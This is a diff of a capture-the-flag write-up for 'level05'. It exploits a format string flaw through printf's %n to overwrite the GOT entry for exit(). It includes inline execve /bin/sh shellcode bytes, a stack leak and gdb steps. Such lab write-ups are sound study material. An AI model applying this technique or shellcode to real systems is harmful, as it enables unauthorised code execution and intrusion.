@@ -1,16 +1,16 @@
 # level05
-RELRO protection is disable  
-Presumption: Overwrite the __Global Offset Table (GOT)__
+RELRO protection is disable. My presumption is that we will have to overwrite the __Global Offset Table (GOT)__
 
 ## Step 1: Understand the program
-1. The program reads 100 bytes and store it in a buffer of 100 bytes (no segfault)
-2. The program iterates over the buffer, and convert uppercase to lowercase (useless)
+1. The program reads 100 bytes and store it in a buffer of 100 byteswith `fgets()`: __No segfault__
+2. The program iterates over the buffer, and convert uppercase to lowercase: __Useless__
 3. The program prints the raw buffer with an unprotected printf. __This is a format string vulnerablity__
 4. finally, the program exits with `exit(0)`
 
 
-## Goal 
-Replace the `exit()` relocation address in the GOT to target a shellcode instead (thanks to the `%n` specifier)
+## Goal
+
+__Replace the `exit()` relocation address in the GOT to target a shellcode instead (thanks to the `%n` specifier)__
 
 
 ## Step 2: Leak the stack
@@ -26,12 +26,16 @@ aaaa 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 6161616
 
 Yeah ! We have access to the buffer through the __10th__ specifer `%x`
 
-## Step 3: Export a  shellcode and locate it
+## Step 3: Shellcode
+### Export shellcode in env
 ```bash
 export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`
 ```
 
 shellcode given [here](https://shell-storm.org/shellcode/files/shellcode-752.html) (21 bytes long)
+
+### Locate shellcode in the memory
+
 ```bash
 (gdb) x/20s *((char **)environ)
 ```
@@ -61,7 +65,7 @@ The address of `exit()` is stored at `0x080497e0` in the __GOT__
 
 1. Write the `exit()` entry point address in the buffer
 2. Access to the buffer with the 10th specifier
-3. Replace the address specified in the buffer by the address of the shellcode using `%n` (%n take a pointer to int32).
+3. Overwrite the content stored at the address specified in the buffer by the address of our shellcode using `%n` (`%n` take a pointer to int32).
 
 
 ```bash
